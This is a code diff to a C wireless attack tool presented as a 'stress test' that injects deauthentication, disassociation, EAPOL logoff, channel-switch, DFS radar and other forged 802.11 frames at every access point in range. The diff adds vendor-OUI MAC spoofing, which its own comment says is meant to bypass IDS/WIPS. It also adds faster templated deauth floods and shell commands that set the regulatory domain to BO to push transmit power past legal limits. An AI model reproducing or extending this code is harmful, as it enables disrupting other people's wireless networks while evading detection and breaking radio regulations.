@@ -399,9 +399,36 @@ static void rand_mac(uint8_t o[6]) {
     xs64_seed(&rng);
     rng_init = true;
   }
+  
+  /* [FIX] OUI-Aware Realistic MAC Spoofing (Bypass IDS/WIPS) */
+  static const uint8_t REAL_OUIS[][3] = {
+      {0x00, 0x14, 0x22}, /* Dell */
+      {0x00, 0x24, 0xD7}, /* Intel */
+      {0x0C, 0x4D, 0xE9}, /* Apple */
+      {0x18, 0x3D, 0xA2}, /* Samsung */
+      {0x30, 0x39, 0x26}, /* Broadcom */
+      {0x48, 0x4B, 0xAA}, /* Cisco */
+      {0x50, 0xCC, 0xF8}, /* Lenovo */
+      {0x90, 0xB6, 0x86}, /* Google */
+  };
+  const int n_ouis = sizeof(REAL_OUIS) / sizeof(REAL_OUIS[0]);
+  
   uint64_t r = xs64_next(&rng);
-  memcpy(o, &r, 6);
-  o[0] = (o[0] & 0xFE) | 0x02; /* Unicast, Locally administered */
+  int oui_idx = (int)(r % n_ouis);
+  
+  /* First 3 bytes are real OUI */
+  o[0] = REAL_OUIS[oui_idx][0];
+  o[1] = REAL_OUIS[oui_idx][1];
+  o[2] = REAL_OUIS[oui_idx][2];
+  
+  /* Last 3 bytes are random */
+  o[3] = (uint8_t)((r >> 8) & 0xFF);
+  o[4] = (uint8_t)((r >> 16) & 0xFF);
+  o[5] = (uint8_t)((r >> 24) & 0xFF);
+  
+  /* Ensure Locally Administered bit is CLEARED (so it looks like a real factory MAC) 
+   * and Multicast bit is CLEARED (Unicast). */
+  o[0] &= 0xFC; 
 }
 
 static void get_term_size(int *c, int *r) {
@@ -3232,24 +3259,17 @@ static void *stress_hopper_thread(void *arg) {
 typedef struct {
   stress_cfg_t *cfg;
   stress_pool_t *pool;
+  int band; /* 2 = 2.4GHz only, 5 = 5GHz only, 0 = both */
+  char iface[MAX_IFACE];
 } stress_inj_arg_t;
 
 static void *stress_injector_thread(void *arg) {
   stress_inj_arg_t *a = (stress_inj_arg_t *)arg;
 
-  int sock_24 = raw_socket(a->cfg->iface);
-  if (sock_24 < 0) {
+  int sock = raw_socket(a->iface);
+  if (sock < 0) {
     free(a);
     return NULL;
-  }
-  
-  int sock_5 = -1;
-  if (a->cfg->dual_radio && a->cfg->iface2[0]) {
-      sock_5 = raw_socket(a->cfg->iface2);
-      if (sock_5 < 0) {
-          fprintf(stderr, "Failed to open dual radio interface %s\n", a->cfg->iface2);
-          /* Fallback or abort? Let's just continue with single radio if failed or maybe abort */
-      }
   }
 
   xorshift64_t rng;
@@ -3281,6 +3301,14 @@ static void *stress_injector_thread(void *arg) {
   uint16_t seq = 0;
   stress_ap_t snap[STRESS_MAX_APS];
 
+  /* [FIX] Zero-Copy Packet Templating: Pre-build templates to avoid thousands of mk_* calls per second */
+  uint8_t tpl_deauth[MAX_PKT_SIZE];
+  int tpl_deauth_len = 0;
+  if (a->cfg->vec_on[VEC_DEAUTH_FLOOD]) {
+      uint8_t dummy_bss[6] = {0};
+      tpl_deauth_len = mk_deauth(tpl_deauth, dummy_bss, BCAST, 7, 0);
+  }
+
   while (!g_stop) {
     int nap = stress_pool_snapshot(a->pool, snap, STRESS_MAX_APS);
     if (nap == 0) {
@@ -3295,10 +3323,10 @@ static void *stress_injector_thread(void *arg) {
     for (int i = 0; i < nap && !g_stop; i++) {
       if (snap[i].channel != cur_ch)
         continue;
-
-      int active_sock = (snap[i].channel <= 14) ? sock_24 : sock_5;
-      if (active_sock < 0)
-          continue; /* Skip if the required socket isn't available */
+        
+      /* [FIX] AP Pool Sharding (Multi-Threading Load Balancer) */
+      if (a->band == 2 && snap[i].channel > 14) continue;
+      if (a->band == 5 && snap[i].channel <= 14) continue;
 
       uint8_t bss[6];
       memcpy(bss, snap[i].bssid, 6);
@@ -3309,20 +3337,26 @@ static void *stress_injector_thread(void *arg) {
 
       /* Build and inject selected vectors on-the-fly */
       if (a->cfg->vec_on[VEC_DEAUTH_FLOOD]) {
-        /* Broadcast deauth */
-        len = mk_deauth(tmp, bss, BCAST, 7, seq++);
-        if (inject_one(active_sock, tmp, len) > 0) {
+        /* Broadcast deauth using Zero-Copy Template */
+        /* Overwrite addr1 (DA - already BCAST), addr2 (SA - BSSID), addr3 (BSSID) */
+        memcpy(tpl_deauth + 10, bss, 6); /* SA */
+        memcpy(tpl_deauth + 16, bss, 6); /* BSSID */
+        /* Overwrite sequence control (offset 22) */
+        uint16_t s_ctrl = htole16((seq++) << 4);
+        memcpy(tpl_deauth + 22, &s_ctrl, 2);
+        
+        if (inject_one(sock, tpl_deauth, tpl_deauth_len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
           sent_for_ap++;
         } else {
           atomic_fetch_add(&g_pkts_fail, 1);
         }
 
-        /* Reverse deauth (client → AP spoof) */
+        /* Reverse deauth (client → AP spoof) - still dynamic due to random client mac */
         uint8_t fake_cli[6];
         rand_mac(fake_cli);
         len = mk_deauth_rev(tmp, bss, fake_cli, 6, seq++);
-        if (inject_one(active_sock, tmp, len) > 0) {
+        if (inject_one(sock, tmp, len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
           sent_for_ap++;
         } else {
@@ -3332,7 +3366,7 @@ static void *stress_injector_thread(void *arg) {
 
       if (a->cfg->vec_on[VEC_DISASSOC_FLOOD]) {
         len = mk_disassoc(tmp, bss, BCAST, 8, seq++);
-        if (inject_one(active_sock, tmp, len) > 0) {
+        if (inject_one(sock, tmp, len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
           sent_for_ap++;
         } else {
@@ -3344,7 +3378,7 @@ static void *stress_injector_thread(void *arg) {
         uint8_t fake_cli[6];
         rand_mac(fake_cli);
         len = mk_eapol_logoff(tmp, bss, fake_cli);
-        if (inject_one(active_sock, tmp, len) > 0) {
+        if (inject_one(sock, tmp, len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
           sent_for_ap++;
         } else {
@@ -3363,7 +3397,7 @@ static void *stress_injector_thread(void *arg) {
         len = mk_csa_beacon(tmp, bss, ssid, (uint8_t)snap[i].channel,
                             (uint8_t)redir);
 
-        if (inject_one(active_sock, tmp, len) > 0) {
+        if (inject_one(sock, tmp, len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
           sent_for_ap++;
         } else {
@@ -3374,7 +3408,7 @@ static void *stress_injector_thread(void *arg) {
       if (a->cfg->vec_on[VEC_BEACON_CONFUSION]) {
         const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";
         len = mk_confusion_beacon(tmp, ssid, (uint8_t)snap[i].channel);
-        if (inject_one(active_sock, tmp, len) > 0) {
+        if (inject_one(sock, tmp, len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
           sent_for_ap++;
         } else {
@@ -3390,7 +3424,7 @@ static void *stress_injector_thread(void *arg) {
         const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";
         len = mk_probe_resp_csa(tmp, bss, BCAST, ssid, (uint8_t)snap[i].channel,
                                 (uint8_t)redir);
-        if (inject_one(active_sock, tmp, len) > 0) {
+        if (inject_one(sock, tmp, len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
           sent_for_ap++;
         } else {
@@ -3403,7 +3437,7 @@ static void *stress_injector_thread(void *arg) {
         uint8_t fm[6];
         rand_mac(fm);
         len = mk_auth(tmp, bss, fm);
-        if (inject_one(active_sock, tmp, len) > 0) {
+        if (inject_one(sock, tmp, len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
           sent_for_ap++;
         } else {
@@ -3417,7 +3451,7 @@ static void *stress_injector_thread(void *arg) {
         if (redir < 1)
           redir = 11;
         len = mk_csa_action(tmp, bss, BCAST, (uint8_t)redir);
-        if (inject_one(active_sock, tmp, len) > 0) {
+        if (inject_one(sock, tmp, len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
           sent_for_ap++;
         } else {
@@ -3428,7 +3462,7 @@ static void *stress_injector_thread(void *arg) {
       if (a->cfg->vec_on[VEC_QUIET_ELEMENT]) {
         const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";
         len = mk_quiet_beacon(tmp, bss, ssid, (uint8_t)snap[i].channel);
-        if (inject_one(active_sock, tmp, len) > 0) {
+        if (inject_one(sock, tmp, len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
           sent_for_ap++;
         } else {
@@ -3438,7 +3472,7 @@ static void *stress_injector_thread(void *arg) {
 
       if (a->cfg->vec_on[VEC_DELBA_ATTACK]) {
         len = mk_delba(tmp, bss, BCAST);
-        if (inject_one(active_sock, tmp, len) > 0) {
+        if (inject_one(sock, tmp, len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
           sent_for_ap++;
         } else {
@@ -3454,13 +3488,13 @@ static void *stress_injector_thread(void *arg) {
         uint8_t tmp1[MAX_PKT_SIZE];
         int len1 = mk_frag_payload(tmp1, bss, fake_cli, fseq, NULL, 0);
 
-        if (inject_one(active_sock, tmp, len0) > 0) {
+        if (inject_one(sock, tmp, len0) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
           sent_for_ap++;
         } else {
           atomic_fetch_add(&g_pkts_fail, 1);
         }
-        if (inject_one(active_sock, tmp1, len1) > 0) {
+        if (inject_one(sock, tmp1, len1) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
           sent_for_ap++;
         } else {
@@ -3476,7 +3510,7 @@ static void *stress_injector_thread(void *arg) {
         const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";
 
         len = mk_dfs_radar_report(tmp, bss, fake_cli, cur);
-        if (inject_one(active_sock, tmp, len) > 0) {
+        if (inject_one(sock, tmp, len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
           sent_for_ap++;
         } else {
@@ -3484,7 +3518,7 @@ static void *stress_injector_thread(void *arg) {
         }
 
         len = mk_dfs_vacate_csa(tmp, bss, ssid, cur, safe);
-        if (inject_one(active_sock, tmp, len) > 0) {
+        if (inject_one(sock, tmp, len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
           sent_for_ap++;
         } else {
@@ -3532,9 +3566,7 @@ static void *stress_injector_thread(void *arg) {
     usleep_precise(base_sleep * 2);
   }
 
-  close(sock_24);
-  if (sock_5 >= 0)
-      close(sock_5);
+  close(sock);
   free(a);
   return NULL;
 }
@@ -3734,6 +3766,30 @@ static void export_report(const char *path, const stress_pool_t *pool,
   printf("  " C_GREEN "[✓] Audit report exported to: %s" RST "\n", path);
 }
 
+/* [FIX] Native TX-Power & Regulatory Domain Unlocker */
+static void unlock_tx_power(const char *iface) {
+  printf("  " C_YELLOW "[!] INSANE mode detected. Attempting to unlock TX power (30dBm) for %s..." RST "\n", iface);
+  char cmd[256];
+  
+  snprintf(cmd, sizeof(cmd), "ifconfig %s down 2>/dev/null", iface);
+  int r1 = system(cmd);
+  
+  snprintf(cmd, sizeof(cmd), "iw reg set BO 2>/dev/null");
+  int r2 = system(cmd);
+  
+  snprintf(cmd, sizeof(cmd), "iwconfig %s txpower 30 2>/dev/null", iface);
+  int r3 = system(cmd);
+  
+  snprintf(cmd, sizeof(cmd), "ifconfig %s up 2>/dev/null", iface);
+  int r4 = system(cmd);
+  
+  if (r1 == 0 && r2 == 0 && r3 == 0 && r4 == 0) {
+      printf("  " C_GREEN "[✓] TX power successfully unlocked to 30dBm (1000mW)!" RST "\n");
+  } else {
+      printf("  " C_RED "[!] Failed to unlock TX power (iw/iwconfig missing or permission denied)." RST "\n");
+  }
+}
+
 /* ---- Stress Test Orchestrator ---- */
 
 static void run_stress(stress_cfg_t *cfg) {
@@ -3756,6 +3812,13 @@ static void run_stress(stress_cfg_t *cfg) {
   if (cfg->duration > 0)
     printf("  " C_GRAY "Duration: " RST " " C_YELLOW "%ds" RST "\n",
            cfg->duration);
+
+  if (cfg->mode == MODE_INSANE) {
+      unlock_tx_power(cfg->iface);
+      if (cfg->dual_radio && cfg->iface2[0]) {
+          unlock_tx_power(cfg->iface2);
+      }
+  }
 
   /* Active vector list */
   for (int v = 0; v < VEC_COUNT; v++) {
@@ -3871,17 +3934,36 @@ static void run_stress(stress_cfg_t *cfg) {
   }
   printf(" " C_AQUA "%d APs found" RST "\n\n", atomic_load(&g_stress_aps_seen));
 
-  /* Start injector threads (2 for throughput) */
+  /* Start injector threads (Sharded Load Balancing) */
   pthread_t inj_t[2];
   int n_inj = 0;
-  for (int i = 0; i < 2 && !g_stop; i++) {
-    stress_inj_arg_t *ia = calloc(1, sizeof(*ia));
-    ia->cfg = cfg;
-    ia->pool = &pool;
-    if (pthread_create(&inj_t[n_inj], NULL, stress_injector_thread, ia) == 0)
+  
+  /* Injector 1: 2.4GHz Dedicated */
+  stress_inj_arg_t *ia1 = calloc(1, sizeof(*ia1));
+  ia1->cfg = cfg;
+  ia1->pool = &pool;
+  ia1->band = 2;
+  snprintf(ia1->iface, MAX_IFACE, "%s", cfg->iface);
+  if (pthread_create(&inj_t[n_inj], NULL, stress_injector_thread, ia1) == 0)
       n_inj++;
-    else
-      free(ia);
+  else
+      free(ia1);
+      
+  /* Injector 2: 5GHz Dedicated (only if scanning 5GHz) */
+  if (cfg->scan_5ghz) {
+      stress_inj_arg_t *ia2 = calloc(1, sizeof(*ia2));
+      ia2->cfg = cfg;
+      ia2->pool = &pool;
+      ia2->band = 5;
+      if (cfg->dual_radio && cfg->iface2[0]) {
+          snprintf(ia2->iface, MAX_IFACE, "%s", cfg->iface2);
+      } else {
+          snprintf(ia2->iface, MAX_IFACE, "%s", cfg->iface);
+      }
+      if (pthread_create(&inj_t[n_inj], NULL, stress_injector_thread, ia2) == 0)
+          n_inj++;
+      else
+          free(ia2);
   }
 
   /* Start display thread */
